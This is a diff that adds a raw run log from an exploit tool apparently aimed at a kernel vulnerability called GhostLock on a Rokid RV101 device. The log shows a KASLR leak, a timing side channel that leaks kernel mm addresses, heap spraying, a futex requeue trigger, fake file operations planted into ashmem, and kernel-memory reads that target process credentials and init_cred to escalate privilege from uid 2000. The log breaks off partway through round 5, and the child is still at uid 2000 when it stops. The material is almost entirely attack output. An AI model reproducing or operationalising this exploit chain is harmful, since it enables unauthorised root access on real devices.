@@ -1,0 +1,502 @@
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=9123 uid=2000 euid=2000 gid=2000
+[*] [T+396346ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffd7a142ac0c slide=0x0000001797800000
+[*] printk_formats: "Function call interrupts" -> 0xffffffd7a14ca100 slide=0x0000001797800000
+[+] KASLR: slide=0x0000001797800000 base=0xffffffd79f800000 (2 anchors)
+[*] FOPS install attempt 1/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000066be30d428 (t=9169, ratio=1833)
+[*]   collision[2]: 00000066bed1b498 (t=9330, ratio=1866)
+[*]   collision[3]: 00000066bf292050 (t=9319, ratio=1863)
+[*] kernelsnitch: top times: 9330 9319 9169 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=10310 mm=FOUND
+[*] kernelsnitch: elapsed 2153ms mm=ffffff80296f9a40
+[*] leaked mm=ffffff80296f9a40 slab base=ffffff80296f8000
+[*] v9.14 settle[settle]: 31 rounds, o2=1842 objs=783 (quiet=20)
+[*] v9.10 gate: mm slabs 84 -> 83 objs 783 -> 667 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 28 -> 3232 across full sequence (gate window 84 -> 3232, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff80296f9608 value=ffffff80296f9500 mode=5 page=ffffff80296f8000 fake_lock=ffffff80296f8e00 fake_w0=ffffff80296f9000 fake_task=ffffff80296f9200 in=0000000000000000 out1=ffffff80296f9600 out2=ffffffd7a21bcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80296f9200 ex3=ffffff80296f8e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=15085
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=15085
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=15085
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=15085
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=15085
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffd7a0a1ab88 read=0xffffffd7a0a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[1] n=15872 llseek=0xffffffd7a0a1ab88 read=0xffffffd7a0a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[2] n=15872 llseek=0xffffffd7a0a1ab88 read=0xffffffd7a0a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffd7a21bcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 2/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000066bc0b9958 (t=9432, ratio=1886)
+[*]   collision[2]: 00000066bc71fc88 (t=9503, ratio=1900)
+[*]   collision[3]: 00000066bcaa98d8 (t=9465, ratio=1893)
+[*] kernelsnitch: top times: 9503 9465 9432 19 19 19 19 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=13622 mm=FOUND
+[*] kernelsnitch: elapsed 1963ms mm=ffffff801e54a580
+[*] leaked mm=ffffff801e54a580 slab base=ffffff801e548000
+[*] v9.14 settle[settle]: 61 rounds, o2=1 objs=1717 (quiet=0)
+[*] v9.10 gate: mm slabs 101 -> 100 objs 1717 -> 1687 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 60 -> 625 across full sequence (gate window 101 -> 625, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff801e549608 value=ffffff801e549500 mode=5 page=ffffff801e548000 fake_lock=ffffff801e548e00 fake_w0=ffffff801e549000 fake_task=ffffff801e549200 in=0000000000000000 out1=ffffff801e549600 out2=ffffffd7a21bcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801e549200 ex3=ffffff801e548e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=27018
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=27018
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=27018
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=27018
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=27018
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffd7a0a1ab88 read=0xffffffd7a0a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[3] n=15872 llseek=0xffffffd7a0a1ab88 read=0xffffffd7a0a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[6] n=15872 llseek=0xffffffd7a0a1ab88 read=0xffffffd7a0a39168 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 661, llseek=0xffffffd7a21bcbc0 exp=0xffffffd7a21bcbc0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd08 len=8 -> r=8 errno=0
+[*] configfs probe: init_task.tasks.next = 0xffffff8001037248
+[+] fake_fops installed into ashmem_misc.fops
+[*] [T+452662ms] FOPS installed
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] round 1/10: child=27037 prev=0xffffff801d3a9708 prev2=0xffffff801d3a9708 stable=1 task=0xffffff801d3a9240
+[*]   cred_slot=0xffffff801d3a99c0 real_cred_slot=0xffffff801d3a99b8 init_cred=0xffffffd7a1a02058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=2.31 0.80 0.35 4/7830 31900
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2092 errno=0 Success
+[*] v9.13 diag: dummy clones ok=221 fail=229 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 253 failed (first err=11)
+Threads:	3844
+[*]   collision[1]: 00000066b9fa1098 (t=8499, ratio=1699)
+[*]   collision[2]: 00000066ba401398 (t=8364, ratio=1672)
+[*]   collision[3]: 00000066ba7af108 (t=8315, ratio=1663)
+[*] kernelsnitch: top times: 8499 8364 8315 19 19 16 16 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1617ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=2.28 0.82 0.36 16/7830 5406
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2082 errno=0 Success
+[*] v9.13 diag: dummy clones ok=211 fail=239 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 243 failed (first err=11)
+Threads:	3854
+[*]   collision[1]: 00000066ba030510 (t=8498, ratio=1699)
+[*]   collision[2]: 00000066ba4b7948 (t=8476, ratio=1695)
+[*]   collision[3]: 00000066ba640590 (t=8487, ratio=1697)
+[*] kernelsnitch: top times: 8498 8487 8476 19 19 19 19 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1586ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] child uid = 2000 (0x000007d0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] round 2/10: child=5407 prev=0xffffff8037b9a948 prev2=0xffffff8037b9a948 stable=1 task=0xffffff8037b9a480
+[*]   cred_slot=0xffffff8037b9ac00 real_cred_slot=0xffffff8037b9abf8 init_cred=0xffffffd7a1a02058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=2.26 0.84 0.37 4/7830 10277
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2087 errno=0 Success
+[*] v9.13 diag: dummy clones ok=216 fail=234 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 248 failed (first err=11)
+Threads:	3849
+[*]   collision[1]: 00000066ba0867c0 (t=8543, ratio=1708)
+[*]   collision[2]: 00000066ba831518 (t=8500, ratio=1700)
+[*]   collision[3]: 00000066baa7b768 (t=1844, ratio=368)
+[*] kernelsnitch: top times: 8543 8500 1844 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1733ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=15.45 3.60 1.27 4/7832 15146
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2090 errno=0 Success
+[*] v9.13 diag: dummy clones ok=217 fail=233 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 249 failed (first err=11)
+Threads:	3848
+[*]   collision[1]: 00000066b9fe52b8 (t=8433, ratio=1686)
+[*]   collision[2]: 00000066ba3c31a8 (t=1850, ratio=370)
+[*]   collision[3]: 00000066ba5ce200 (t=8673, ratio=1734)
+[*] kernelsnitch: top times: 8673 8433 1850 19 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1450ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] child uid = 2000 (0x000007d0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] round 3/10: child=15148 prev=0xffffff80550384c8 prev2=0xffffff80550384c8 stable=1 task=0xffffff8055038000
+[*]   cred_slot=0xffffff8055038780 real_cred_slot=0xffffff8055038778 init_cred=0xffffffd7a1a02058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=6 threshold=60
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=15.45 3.60 1.27 16/7833 20492
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2089 errno=0 Success
+[*] v9.13 diag: dummy clones ok=215 fail=235 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 247 failed (first err=11)
+Threads:	3850
+[*]   collision[1]: 00000066b9fc81d0 (t=2387, ratio=397)
+[*]   collision[2]: 00000066ba88c7f0 (t=8498, ratio=1416)
+[*]   collision[3]: 00000066baa54630 (t=8514, ratio=1419)
+[*] kernelsnitch: top times: 8514 8498 2387 20 20 20 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1699ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=14.30 3.56 1.27 40/7833 25376
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2088 errno=0 Success
+[*] v9.13 diag: dummy clones ok=214 fail=236 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 246 failed (first err=11)
+Threads:	3851
+[*]   collision[1]: 00000066b9fa30a8 (t=2911, ratio=582)
+[*]   collision[2]: 00000066b9fe72c8 (t=1848, ratio=369)
+[*]   collision[3]: 00000066ba074730 (t=1852, ratio=370)
+[*] kernelsnitch: top times: 2911 1852 1848 20 20 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1078ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] child uid = 2000 (0x000007d0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] round 4/10: child=25377 prev=0xffffff800439f248 prev2=0xffffff800439f248 stable=1 task=0xffffff800439ed80
+[*]   cred_slot=0xffffff800439f500 real_cred_slot=0xffffff800439f4f8 init_cred=0xffffffd7a1a02058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=13.31 3.53 1.27 4/7833 31469
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2081 errno=0 Success
+[*] v9.13 diag: dummy clones ok=207 fail=243 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 239 failed (first err=11)
+Threads:	3858
+[*]   collision[1]: 00000066ba74ee00 (t=1850, ratio=370)
+[*]   collision[2]: 00000066ba782fa0 (t=1860, ratio=372)
+[*]   collision[3]: 00000066ba8877c8 (t=8775, ratio=1755)
+[*] kernelsnitch: top times: 8775 1860 1850 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1558ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=13.21 3.67 1.33 18/7833 4975
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2083 errno=0 Success
+[*] v9.13 diag: dummy clones ok=209 fail=241 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 241 failed (first err=11)
+Threads:	3856
+[*]   collision[1]: 00000066b9f9f088 (t=2906, ratio=581)
+[*]   collision[2]: 00000066ba55fe88 (t=8767, ratio=1753)
+[*]   collision[3]: 00000066ba730d10 (t=1841, ratio=368)
+[*] kernelsnitch: top times: 8767 2906 1841 20 19 16 16 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1469ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[*] child uid = 2000 (0x000007d0)
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] configfs_read: blob OK, about to pread
+[*] configfs_read target=0xffffffd7a19ebd10 len=8 -> r=8 errno=0
+[*] round 5/10: child=4976 prev=0xffffff801ccb7248 prev2=0xffffff801ccb7248 stable=1 task=0xffffff801ccb6d80
+[*]   cred_slot=0xffffff801ccb7500 real_cred_slot=0xffffff801ccb74f8 init_cred=0xffffffd7a1a02058
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+Threads:	4097
